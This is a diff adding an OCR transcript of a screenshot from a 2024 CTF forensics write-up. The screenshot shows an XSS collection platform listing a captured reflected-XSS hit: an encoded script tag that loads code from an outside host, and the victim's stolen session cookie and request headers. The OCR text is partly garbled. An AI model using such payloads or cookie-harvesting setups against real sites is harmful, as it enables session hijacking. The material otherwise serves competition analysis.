@@ -1,0 +1,36 @@
+# OCR: 587ab271817b7e4c8055bfa53361341b.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/587ab271817b7e4c8055bfa53361341b.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:15
+
+Xss平台
+我的项目
+主页
+gryhoutai default
+我的模块公共模块
+基础认证钓鱼 Xss.s
+默认模块
+创建创建
+项目内容
+项目名称：glyhoutai Domain:全部
+用户：admin
+个人设置
+邀请器醋
+退出登陆香看代码
+接口地址：http://192.168.217.188:7788/do/auth/37dc70e8bb7fdbc7cb05687e58858244（加/domain/xxx可通过域名过滤内容）安装播件
+圈
++全部折叠
+时间
+2024-05-21 10:47:10
+选中项操作：删除
+接收的内容
+location:http://jinsha.abc/jin sa/jinsa/vul/xss/xssreflecte dget.php?message=%3Csc riptSrc%3Dhttp%3A%2F%2 F192.168.11.188%3A7788% 2FHw41Iz%3F171625960 8%3E%3C%2Fscript%3E&s ubmit=submit
+toplocation;http://jinsha.ab c/jinsa/jinsa/vul/xss/xssrefle ctedget.php?message=%3 Cscriptsrc%3Dhttp%3A%2 F%2F192168.11.188%3A77 88%2FHW41Iz%3F1716259 608%3E%3C%2Fscript%3E&submit=submit
+：cookie:PHPSEsSID=oku4s
+6nmm3taqjkph650rig394.opener:
+RequestHeaders
+HTTPREFERER:http://jinS ha.abc/
+·HTTP_USERAGENT:MoZ illa/5.0(WindowsNT10.0 Win64:x64)AppleWebKit/53 7.36 (KHTML, like Gecko) C hrome/124.0.0.0Safari/537 36
+REMOTEADDR:192.168 11.1
+操作删除
